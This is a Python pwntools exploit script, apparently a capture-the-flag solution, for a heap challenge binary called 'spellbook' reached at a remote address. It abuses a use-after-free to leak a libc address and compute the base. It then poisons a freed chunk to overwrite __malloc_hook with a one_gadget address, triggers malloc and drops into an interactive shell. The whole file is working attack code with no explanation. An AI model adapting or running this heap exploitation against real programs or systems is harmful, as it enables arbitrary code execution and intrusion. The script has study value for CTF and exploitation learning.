#!/usr/bin/env python3

from pwn import *

exe = ELF("./spellbook_patched",checksec=False)
libc = ELF("./libc.so.6",checksec=False)
ld = ELF("./ld-linux-x86-64.so.2",checksec=False)

context.binary = exe

#p = process()
p = remote('94.237.56.187',55524)

def add(idx,type_,power,data):
    p.sendlineafter(b'>> ',b'1')
    p.sendlineafter(b'entry: ',f'{idx}'.encode())
    p.sendlineafter(b'type: ',type_)
    p.sendlineafter(b'power: ',f'{power}'.encode())
    p.sendafter(b': ',data)
def show(idx):
    p.sendlineafter(b'>> ',b'2')
    p.sendlineafter(b'entry: ',f'{idx}'.encode())
def edit(entry,type_data,data):
    p.sendlineafter(b'>> ',b'3')
    p.sendlineafter(b'entry: ',f'{entry}'.encode())
    p.sendlineafter(b'type: ',type_data)
    p.sendafter(b': ',data)
def delete(idx):
    p.sendlineafter(b'>> ',b'4')
    p.sendlineafter(b'entry: ',f'{idx}'.encode())

add(0,b'%p%p%p',500,b'%p%p%p')
add(1,b'%p%p%p',20,b'%p%p%p')


delete(0)
show(0)
p.recvuntil(b'type: ')
p.recvuntil(b': ')
leak = u64(p.recv(6).ljust(8,b'\x00'))
log.info(f'leak: {hex(leak)}')

libc.address = leak - 0x3c4b78
log.info(f'libc: {hex(libc.address)}')
one_gadget = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
input()
add(2,b'%p%p%p',0x68,b'abcd')
delete(2)
delete(1)
edit(2,b'c',p64(libc.sym.__malloc_hook-35))
add(3,b'aaa',0x68,b'zxcv')
add(4,b'%p%p%p',0x68,cyclic(19) + p64(libc.address + one_gadget[1]))

p.sendlineafter(b'>> ',b'1')
p.sendlineafter(b'entry: ',b'5')



p.interactive()


